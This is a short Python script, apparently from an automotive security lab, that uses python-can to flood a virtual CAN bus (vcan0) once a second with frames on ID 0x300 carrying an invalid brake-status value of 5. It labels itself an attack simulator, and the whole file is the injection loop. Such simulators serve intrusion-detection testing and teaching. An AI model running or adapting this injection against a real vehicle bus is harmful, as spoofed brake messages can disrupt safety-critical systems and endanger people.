import can
import time

CAN_ID = 0x300

bus = can.Bus(
    interface="socketcan",
    channel="vcan0"
)

print("=" * 60)
print(" INVALID BRAKE STATUS ATTACK SIMULATOR")
print("=" * 60)
print()
print("Target CAN ID : 0x300")
print("Fake Status   : 5")
print("Valid values  : 0 or 1")
print()
print("Press CTRL+C to stop.")
print("=" * 60)
print()

try:
    while True:

        brake_status = 5

        message = can.Message(
            arbitration_id=CAN_ID,
            data=[brake_status],
            is_extended_id=False
        )

        bus.send(message)

        print(
            f"ATTACK -> Brake Status={brake_status}"
        )

        time.sleep(1)

except KeyboardInterrupt:

    print()
    print("Invalid brake attack stopped.")

finally:

    bus.shutdown()
